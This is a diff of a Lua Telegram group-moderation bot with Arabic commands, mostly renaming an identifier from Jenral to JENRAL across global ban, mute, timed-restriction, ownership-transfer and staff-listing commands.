 ReplyStatus(msg,user,"Reply","⌁︙تم الغاء تقيده من المجموعه")  
 end
 end 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         BanAll         --
 if SecondSudo(msg) then
 if text ==('حضر عام') or text ==('حظر عام') then
 function BanAllReply(extra, result, success)
-if tonumber(result.sender_user_id_) == tonumber(Jenral) then  
+if tonumber(result.sender_user_id_) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
 return false 
 end
@@ -5921,12 +5909,12 @@ if SudoId(result.sender_user_id_) == true then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevALI:sismember(Jenral..'ALI:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
+if DevALI:sismember(JENRAL..'ALI:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
 return false 
 end
 ChatKick(result.chat_id_, result.sender_user_id_)
-DevALI:sadd(Jenral..'ALI:BanAll:', result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:BanAll:', result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم حظره عام من المجموعات")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5935,7 +5923,7 @@ end end
 if text and (text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')) then
 local username = text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')
 function BanAllUser(extra,result,success)
-if tonumber(result.id_) == tonumber(Jenral) then  
+if tonumber(result.id_) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
 return false 
 end
@@ -5943,13 +5931,13 @@ if SudoId(result.id_) == true then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevALI:sismember(Jenral..'ALI:SecondSudo:',result.id_) and not Sudo(msg) then
+if DevALI:sismember(JENRAL..'ALI:SecondSudo:',result.id_) and not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
 return false 
 end
 if result.id_ then
 ChatKick(msg.chat_id_, result.id_)
-DevALI:sadd(Jenral..'ALI:BanAll:', result.id_)
+DevALI:sadd(JENRAL..'ALI:BanAll:', result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم حظره عام من المجموعات")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5958,7 +5946,7 @@ resolve_username(username,BanAllUser)
 end
 if text and (text:match('^حضر عام (%d+)') or text:match('^حظر عام (%d+)')) then
 local user = text:match('حضر عام (%d+)') or text:match('حظر عام (%d+)')
-if tonumber(user) == tonumber(Jenral) then  
+if tonumber(user) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر البوت عام*", 1, 'md')
 return false 
 end
@@ -5966,19 +5954,19 @@ if SudoId(tonumber(user)) == true then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevALI:sismember(Jenral..'ALI:SecondSudo:',user) and not Sudo(msg) then
+if DevALI:sismember(JENRAL..'ALI:SecondSudo:',user) and not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
 return false 
 end
 ChatKick(msg.chat_id_, user)
-DevALI:sadd(Jenral..'ALI:BanAll:', user)
+DevALI:sadd(JENRAL..'ALI:BanAll:', user)
 ReplyStatus(msg,user,"Reply","⌁︙تم حظره عام من المجموعات")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         MuteAll        --
 if text ==('كتم عام') then
 function MuteAllReply(extra, result, success)
-if tonumber(result.sender_user_id_) == tonumber(Jenral) then  
+if tonumber(result.sender_user_id_) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
 return false 
 end
@@ -5986,11 +5974,11 @@ if SudoId(result.sender_user_id_) == true then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevALI:sismember(Jenral..'ALI:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
+if DevALI:sismember(JENRAL..'ALI:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
 return false 
 end
-DevALI:sadd(Jenral..'ALI:MuteAll:', result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:MuteAll:', result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم كتمه عام من المجموعات")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5999,7 +5987,7 @@ end end
 if text and text:match('^كتم عام @(.*)') then
 local username = text:match('^كتم عام @(.*)')
 function MuteAllUser(extra,result,success)
-if tonumber(result.id_) == tonumber(Jenral) then  
+if tonumber(result.id_) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
 return false 
 end
@@ -6007,12 +5995,12 @@ if SudoId(result.id_) == true then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevALI:sismember(Jenral..'ALI:SecondSudo:',result.id_) and not Sudo(msg) then
+if DevALI:sismember(JENRAL..'ALI:SecondSudo:',result.id_) and not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
 return false 
 end
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:MuteAll:', result.id_)
+DevALI:sadd(JENRAL..'ALI:MuteAll:', result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم كتمه عام من المجموعات")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -6021,7 +6009,7 @@ resolve_username(username,MuteAllUser)
 end
 if text and text:match('^كتم عام (%d+)') then
 local user = text:match('كتم عام (%d+)')
-if tonumber(user) == tonumber(Jenral) then  
+if tonumber(user) == tonumber(JENRAL) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم البوت عام*", 1, 'md')
 return false 
 end
@@ -6029,19 +6017,19 @@ if SudoId(tonumber(user)) == true then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevALI:sismember(Jenral..'ALI:SecondSudo:',user) and not Sudo(msg) then
+if DevALI:sismember(JENRAL..'ALI:SecondSudo:',user) and not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
 return false 
 end
-DevALI:sadd(Jenral..'ALI:MuteAll:', user)
+DevALI:sadd(JENRAL..'ALI:MuteAll:', user)
 ReplyStatus(msg,user,"Reply","⌁︙تم كتمه عام من المجموعات")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         UnAll          --
 if text ==('الغاء عام') or text ==('الغاء العام') then
 function UnAllReply(extra, result, success)
-DevALI:srem(Jenral..'ALI:BanAll:', result.sender_user_id_)
-DevALI:srem(Jenral..'ALI:MuteAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:BanAll:', result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:MuteAll:', result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -6051,8 +6039,8 @@ if text and (text:match('^الغاء عام @(.*)') or text:match('^الغاء �
 local username = text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')
 function UnAllUser(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:BanAll:', result.id_)
-DevALI:srem(Jenral..'ALI:MuteAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:BanAll:', result.id_)
+DevALI:srem(JENRAL..'ALI:MuteAll:', result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -6061,28 +6049,28 @@ resolve_username(username,UnAllUser)
 end
 if text and (text:match('^الغاء عام (%d+)') or text:match('^الغاء العام (%d+)')) then
 local user = text:match('الغاء عام (%d+)') or text:match('الغاء العام (%d+)')
-DevALI:srem(Jenral..'ALI:BanAll:', user)
-DevALI:srem(Jenral..'ALI:MuteAll:', user)
+DevALI:srem(JENRAL..'ALI:BanAll:', user)
+DevALI:srem(JENRAL..'ALI:MuteAll:', user)
 ReplyStatus(msg,user,"Reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي" or text == "↫ تغير المطور الاساسي ⌁") and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
 send(msg.chat_id_, msg.id_,'⌁︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
-DevALI:setex(Jenral.."ALI:EditDev"..msg.sender_user_id_,300,true)
+DevALI:setex(JENRAL.."ALI:EditDev"..msg.sender_user_id_,300,true)
 end
-if DevALI:get(Jenral.."ALI:EditDev"..msg.sender_user_id_) then
+if DevALI:get(JENRAL.."ALI:EditDev"..msg.sender_user_id_) then
 if text and text:match("^الغاء$") then 
 send(msg.chat_id_, msg.id_,'⌁︙تم الغاء امر تغير المطور الاساسي')
-DevALI:del(Jenral.."ALI:EditDev"..msg.sender_user_id_)
+DevALI:del(JENRAL.."ALI:EditDev"..msg.sender_user_id_)
 return false
 end
 if text and text:match("^(%d+)$") then 
 tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
 if dp.first_name_ ~= false then
-DevALI:del(Jenral.."ALI:EditDev"..msg.sender_user_id_)
-DevALI:set(Jenral.."ALI:NewDev"..msg.sender_user_id_,dp.id_)
+DevALI:del(JENRAL.."ALI:EditDev"..msg.sender_user_id_)
+DevALI:set(JENRAL.."ALI:NewDev"..msg.sender_user_id_,dp.id_)
 if dp.username_ ~= false then DevUser = '\n⌁︙المعرف ↫ [@'..dp.username_..']' else DevUser = '' end
 local Text = '⌁︙الايدي ↫ '..dp.id_..DevUser..'\n⌁︙الاسم ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n⌁︙تم حفظ المعلومات بنجاح\n⌁︙استخدم الازرار للتاكيد ↫ ⤈'
 keyboard = {} 
@@ -6091,37 +6079,37 @@ Msg_id = msg.id_/2097152/0.5
 return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 else
 send(msg.chat_id_, msg.id_,"⌁︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
-DevALI:del(Jenral.."ALI:EditDev"..msg.sender_user_id_)
+DevALI:del(JENRAL.."ALI:EditDev"..msg.sender_user_id_)
 end
 end,nil)
 return false
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if msg.reply_to_message_id_ ~= 0 then
-if text and text:match("^رفع مطي$") and not DevALI:get(Jenral..'ALI:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
+if text and text:match("^رفع مطي$") and not DevALI:get(JENRAL..'ALI:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
 function donky_by_reply(extra, result, success)
-if DevALI:sismember(Jenral..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو مطي شرفع منه بعد😹💔") 
 else
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطايه") 
-DevALI:sadd(Jenral..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
+DevALI:sadd(JENRAL..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 if msg.reply_to_message_id_ ~= 0  then
-if text and text:match("^تنزيل مطي$") and not DevALI:get(Jenral..'ALI:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
+if text and text:match("^تنزيل مطي$") and not DevALI:get(JENRAL..'ALI:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
 function donky_by_reply(extra, result, success)
-if not DevALI:sismember(Jenral..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
+if not DevALI:sismember(JENRAL..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو ليس مطي ليتم تنزيله") 
 else
-DevALI:srem(Jenral..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطايه") 
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text and (text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')) and ChCheck(msg) then 
 local function mut_time(extra, result,success)
@@ -6133,7 +6121,7 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRan
 else 
 https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده لمدة ↫ "..mutept.." د") 
-DevALI:sadd(Jenral..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 end end 
 if tonumber(msg.reply_to_message_id_) == 0 then else
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
@@ -6148,7 +6136,7 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRan
 else 
 https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده لمدة ↫ "..mutept.." س") 
-DevALI:sadd(Jenral..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 end end
 if tonumber(msg.reply_to_message_id_) == 0 then else
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
@@ -6163,18 +6151,18 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRan
 else 
 https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده لمدة ↫ "..mutept.." ي") 
-DevALI:sadd(Jenral..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 end end
 if tonumber(msg.reply_to_message_id_) == 0 then else
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
 end 
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
 if Constructor(msg) then
 TXT = text:match("^اضف رسائل (%d+)$")
-DevALI:set('JenralTEAM:'..Jenral..'id:user'..msg.chat_id_,TXT)  
-DevALI:setex('JenralTEAM:'..Jenral.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
+DevALI:set('JENRALTEAM:'..JENRAL..'id:user'..msg.chat_id_,TXT)  
+DevALI:setex('JENRALTEAM:'..JENRAL.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد الرسائل الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
 Dev_ALI(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
 else 
@@ -6184,8 +6172,8 @@ end
 if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 local Num = text:match("^اضف رسائل (%d+)$")
 function Reply(extra, result, success)
-DevALI:del(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
-DevALI:incrby(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
+DevALI:del(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
+DevALI:incrby(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة "..Num..' رساله', 1, 'md') 
 end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
@@ -6194,8 +6182,8 @@ end
 if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
 if Constructor(msg) then
 TXT = text:match("^اضف نقاط (%d+)$")
-DevALI:set('JenralTEAM:'..Jenral..'ids:user'..msg.chat_id_,TXT)  
-DevALI:setex('JenralTEAM:'..Jenral.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
+DevALI:set('JENRALTEAM:'..JENRAL..'ids:user'..msg.chat_id_,TXT)  
+DevALI:setex('JENRALTEAM:'..JENRAL.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد النقاط الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
 Dev_ALI(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
 else 
@@ -6205,24 +6193,24 @@ end
 if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 local Num = text:match("^اضف نقاط (%d+)$")
 function Reply(extra, result, success)
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم اضافة "..Num..' نقطه', 1, 'md') 
 end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
 return false
 end
-if DevALI:get(Jenral..'ALI:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevALI:sadd(Jenral.."ALI:cleaner"..msg.chat_id_, msg.id_) else DevALI:sadd(Jenral.."ALI:cleaner"..msg.chat_id_, msg.id_) end end end
+if DevALI:get(JENRAL..'ALI:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevALI:sadd(JENRAL.."ALI:cleaner"..msg.chat_id_, msg.id_) else DevALI:sadd(JENRAL.."ALI:cleaner"..msg.chat_id_, msg.id_) end end end
 if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
 if text and text:match("^تثبيت$") and ChCheck(msg) then 
-if DevALI:sismember(Jenral.."ALI:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
+if DevALI:sismember(JENRAL.."ALI:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
 Dev_ALI(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
 return false  
 end
 tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
 if data.ID == "Ok" then
-DevALI:set(Jenral..'ALI:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تثبيت الرساله بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تثبيت الرساله بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 return false  
 end
 if data.code_ == 6 then
@@ -6236,13 +6224,13 @@ end
 end,nil)
 end 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text == "المميزين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:VipMem:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:VipMem:'..msg.chat_id_)
 text = "⌁︙قائمة المميزين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6253,14 +6241,14 @@ text = "⌁︙*لا يوجد مميزين*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end end 
---     Source Jenral     --
+--     Source JENRAL     --
 if Manager(msg) then
 if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
 local ALI =  'ALI:Admins:'..msg.chat_id_
-local List = DevALI:smembers(Jenral..ALI)
+local List = DevALI:smembers(JENRAL..ALI)
 text = "⌁︙قائمة الادمنيه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6271,13 +6259,13 @@ text = "⌁︙*لا يوجد ادمنيه*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end end
---     Source Jenral     -- 
+--     Source JENRAL     -- 
 if Constructor(msg) then
 if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:Managers:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Managers:'..msg.chat_id_)
 text = "⌁︙قائمة المدراء ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6289,10 +6277,10 @@ end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 if text == "المنظفين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:Cleaner:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Cleaner:'..msg.chat_id_)
 text = "⌁︙قائمة المنظفين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6303,13 +6291,13 @@ text = "⌁︙*لا يوجد منظفين*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end end 
---     Source Jenral     --
+--     Source JENRAL     --
 if BasicConstructor(msg) then
 if text == "المنشئين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:Constructor:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:Constructor:'..msg.chat_id_)
 text = "⌁︙قائمة المنشئين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6320,13 +6308,13 @@ text = "⌁︙*لا يوجد منشئين*"
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end end 
---     Source Jenral     --
+--     Source JENRAL     --
 if ALIConstructor(msg) then
 if text == "المالكين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:ALIConstructor:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_)
 text = "⌁︙قائمة المالكين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6338,10 +6326,10 @@ end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 if text == "المنشئين الاساسيين" and ChCheck(msg) or text == "منشئين اساسيين" and ChCheck(msg) or text == "المنشئين الاساسين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:BasicConstructor:'..msg.chat_id_)
+local List = DevALI:smembers(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_)
 text = "⌁︙قائمة المنشئين الاساسيين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local username = DevALI:get(Jenral..'Save:UserName'..v)
+local username = DevALI:get(JENRAL..'Save:UserName'..v)
 if username then
 text = text..k.."~ : [@"..username.."]\n"
 else
@@ -6353,31 +6341,31 @@ end
 Dev_ALI(msg.chat_id_, msg.id_, 1, text, 1, "md")
 end 
 end 
-if text ==("المنشئ") and ChCheck(msg) or text ==("المالك") and ChCheck(msg) then
+if text ==("المنشئ") then
 tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
 local admins = data.members_
 for i=0 , #admins do
 if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
-Manager_id = admins[i].user_id_
-tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,dp) 
-if dp.first_name_ == false then
-Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙حساب المنشئ محذوف", 1, "md")
+owner_id = admins[i].user_id_
+tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
+if b.first_name_ == false then
+send(msg.chat_id_, msg.id_," *𖤓│حساب المنشئ محذوف*")
 return false  
 end
-local UserName = (dp.username_ or "GENRALTEAM")
-Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙مالك المجموعه ↫ ["..dp.first_name_.."](T.me/"..UserName..")", 1, "md")  
+local UserName = (b.username_ or "venom_source")
+send(msg.chat_id_, msg.id_," 𖤓│منشئ الكروب » ["..b.first_name_.."](T.me/"..UserName..")")  
 end,nil)   
 end
 end
 end,nil)   
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if text == "المكتومين" and ChCheck(msg) then 
-local List = DevALI:smembers(Jenral..'ALI:Muted:'..msg.chat_id_)
